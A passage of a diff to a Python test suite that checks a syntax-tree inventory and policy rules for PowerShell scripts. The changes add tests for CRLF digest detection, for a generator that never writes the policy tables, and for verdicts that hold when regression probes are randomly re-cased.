-    unchanged but change the source digest; CRLF line endings must change
-    nothing at all (checkout-independence)."""
+    unchanged but change the source digest, and so must CRLF line endings
+    (the digest is over exact bytes; .gitattributes pins LF and check_ast
+    refuses CR)."""
     exe = _pwsh()
     path = _SCRIPTS / script
     source = path.read_bytes().decode("ascii")
@@ -4717,11 +5612,104 @@ def test_inventory_detects_systematic_mutations(tmp_path: Path, script: str) -> 
             undetected.append(label)
     assert not undetected, f"{script}: mutations not reflected in the syntax tree: {undetected}"
     assert clean >= len(mutants) * 0.6, f"{script}: only {clean}/{len(mutants)} mutants parsed"
-    for name in ("comment", "whitespace"):
+    for name in ("comment", "whitespace"):  # AST-neutral by construction
         changed = by_path[f"neutral-{name}.ps1"]
         assert changed["ast"] == original["ast"], f"{script}: {name}-only edit changed the tree"
         assert changed["source_sha256"] != original["source_sha256"], name
-    assert by_path["neutral-crlf.ps1"] == original, f"{script}: CRLF changed the inventory"
+    crlf = by_path["neutral-crlf.ps1"]
+    assert crlf["source_sha256"] != original["source_sha256"], f"{script}: CRLF not detected"
+
+
+def test_generator_never_writes_policy(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+    """The generator writes only the golden file. The semantic policy tables
+    (POLICIES, PINNED_VARS, GUARDED_OPS, LOCAL_FUNCTION_BODIES, ...) are hand-
+    maintained in this file, so a regeneration can never widen them."""
+    import inspect
+
+    generator = (_REPO / "scripts" / "gen_collector_inventory.py").read_text(encoding="utf-8")
+    for token in (
+        "PINNED_VARS",
+        "GUARDED_OPS",
+        "LOCAL_FUNCTION_BODIES",
+        "POLICIES",
+        "write_text",
+        "write_bytes",
+        "open(",
+    ):
+        assert token not in generator, f"generator must not touch {token}"
+    source = inspect.getsource(write_golden_inventory)
+    assert source.count("write_text") == 1 and "GOLDEN_PATH.write_text(" in source
+    for token in ("write_bytes", "open("):
+        assert token not in source
+    guarded = sorted((_REPO / "tests").rglob("*.py")) + sorted((_REPO / "scripts").glob("*"))
+    before = {p: p.read_bytes() for p in guarded if p.is_file()}
+    monkeypatch.setitem(globals(), "GOLDEN_PATH", tmp_path / "collector-inventory.json")
+    write_golden_inventory(_pwsh())
+    assert (tmp_path / "collector-inventory.json").is_file()
+    assert {p: p.read_bytes() for p in before} == before, "generator modified a tracked file"
+
+
+# Letters outside quoted strings are re-cased; string contents are data and stay.
+def _random_case(text: str, seed: str) -> str:
+    # Deterministic per-character coin from the seed (reproducible, no RNG state).
+    bits = hashlib.sha256(seed.encode()).digest() * (len(text) // 256 + 1)
+    out: list[str] = []
+    quote: str | None = None
+    for i, ch in enumerate(text):
+        if quote:
+            out.append(ch)
+            if ch == quote:
+                quote = None
+            continue
+        if ch in "'\"":
+            quote = ch
+            out.append(ch)
+            continue
+        flip = (bits[i // 8] >> (i % 8)) & 1
+        out.append(ch.upper() if ch.isalpha() and flip else ch.lower())
+    return "".join(out)
+
+
+def _random_case_edit(mode: str, edit: str | tuple[str, str], seed: str) -> str | tuple[str, str]:
+    if isinstance(edit, str):
+        return _random_case(edit, seed)
+    anchor, change = edit
+    return (anchor, _random_case(change, seed))
+
+
+def test_regression_verdicts_are_case_insensitive(tmp_path: Path) -> None:
+    """Cross-repo class (adcs-lens `_WRITEJSON` vs `_writeJson`): PowerShell
+    resolves commands, functions, parameters, members, types and variables
+    case-insensitively, so every regression probe re-cased at random must get
+    the same verdict — flagged by its intended check, not by a parse error."""
+    exe = _pwsh()
+    base_inv = _inventory_for(exe)
+    files: list[Path] = []
+    for probe_id, base, position, snippet in _REGRESSIONS:
+        text = (_SCRIPTS / base).read_text(encoding="utf-8")
+        mutated = _apply_edit(text, position, _random_case_edit(position, snippet, probe_id))
+        target = tmp_path / probe_id / base
+        target.parent.mkdir()
+        target.write_bytes(mutated.encode("utf-8"))
+        files.append(target)
+    results = [_canonicalize(e) for e in _run_dumper_raw(exe, [str(f) for f in files], timeout=900)]
+    wrong: list[str] = []
+    for (probe_id, base, _position, _snippet), entry in zip(_REGRESSIONS, results, strict=True):
+        assert Path(entry["path"]).parent.name == probe_id
+        inv = dict(base_inv)
+        inv[base] = entry
+        failed = _run_checks(base, inv)
+        expected = _PROBE_EXPECTED_CHECK[probe_id]
+        if expected not in failed or ("parse" in failed and "using" not in probe_id):
+            wrong.append(f"{probe_id}: expected {expected!r}, raised {sorted(failed)}")
+    assert not wrong, "re-cased probes changed verdict:\n" + "\n".join(wrong)
+
+
+@pytest.mark.parametrize("script", sorted(POLICIES))
+def test_local_function_bodies_are_pinned(
+    inventory: dict[str, dict[str, Any]], script: str
+) -> None:
+    check_local_function_bodies(script, inventory[script])
 
 
 def test_clean_scripts_pass_all_checks(inventory: dict[str, dict[str, Any]]) -> None:
